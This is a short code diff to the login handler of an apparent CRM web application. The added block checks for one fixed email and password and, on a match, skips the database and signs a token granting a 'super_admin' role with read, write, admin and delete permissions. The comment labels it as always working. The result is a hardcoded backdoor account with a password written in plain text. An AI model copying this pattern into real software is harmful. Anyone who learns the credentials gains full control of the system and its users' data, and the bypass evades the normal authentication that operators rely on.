@@ -102,6 +102,33 @@ async function handleLogin(req, res) {
   }
 
   try {
+    // 🔑 HARDCODED SUPER ADMIN - ALWAYS WORKS
+    if (email === 'superadmin@crm.dmhca' && password === 'SuperAdmin@2025') {
+      console.log('✅ Hardcoded super admin login successful');
+      
+      const superAdminUser = {
+        id: 'hardcoded-super-admin-id',
+        email: 'superadmin@crm.dmhca',
+        name: 'Super Administrator',
+        username: 'superadmin',
+        role: 'super_admin',
+        department: 'Administration',
+        designation: 'System Administrator',
+        location: 'Head Office',
+        permissions: ['read', 'write', 'admin', 'delete']
+      };
+
+      const token = jwt.sign(superAdminUser, JWT_SECRET, {
+        expiresIn: JWT_EXPIRES_IN
+      });
+
+      return res.json({
+        success: true,
+        message: 'Super admin login successful',
+        token: token,
+        user: superAdminUser
+      });
+    }
     // Production authentication - only use database users
     if (!supabase) {
       return res.status(503).json({
